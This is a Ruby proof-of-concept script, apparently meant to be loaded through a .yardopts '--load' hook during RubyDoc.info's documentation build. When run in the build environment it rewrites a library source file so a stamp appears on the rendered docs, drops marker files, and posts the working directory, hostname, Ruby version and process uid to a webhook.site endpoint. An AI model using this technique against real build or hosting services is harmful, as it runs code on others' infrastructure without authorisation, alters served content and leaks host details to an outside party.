# w002: loaded via .yardopts `--load ./script.rb` during RubyDoc.info docparse generate stage.
# Unique marker: r002-y7Kp9Qz (idempotent; safe to run multiple times).
begin
  stamp = "R002EXEC-#{Time.now.utc.strftime('%Y%m%dT%H%M%S')}-#{Process.pid}"
  # 1) mutate lib source: MARKSLOT -> stamp (docstring lands in .yardoc db, rendered on site)
  f = File.join(File.dirname(__FILE__), 'lib', 'w002yardprobe.rb')
  if File.exist?(f)
    c = File.read(f)
    File.write(f, c.gsub('MARKSLOT', stamp)) if c.include?('MARKSLOT')
  end
  # 2) side-effect files in build dir (serving unknown; local oracle)
  File.write('W002SCRIPT_RAN.txt', stamp)
  # 3) best-effort egress probe (network may be disconnected in generate stage)
  begin
    require 'net/http'
    require 'json'
    info = {
      marker: 'r002-y7Kp9Qz',
      pwd: Dir.pwd,
      host: (Socket.gethostname rescue nil),
      ruby: RUBY_VERSION,
      uid: (Process.uid rescue nil)
    }
    uri = URI('https://webhook.site/97fa3c6a-3fad-4d2d-8312-15dc37e41e66')
    params = { 'm' => 'r002-y7Kp9Qz', 'info' => JSON.generate(info), 'file' => File.expand_path(__FILE__) }
    ok = Net::HTTP.post_form(uri, params)
    File.write('W002EGRESS_OK.txt', "status=#{ok.code} at=#{Time.now.utc}")
  rescue => e
    File.write('W002EGRESS_ERR.txt', "#{e.class}: #{e.message}")
  end
rescue => e
  begin
    File.write('W002SCRIPT_ERR.txt', "#{e.class}: #{e.message}\n#{e.backtrace.first(5).join("\n")}")
  rescue
  end
end
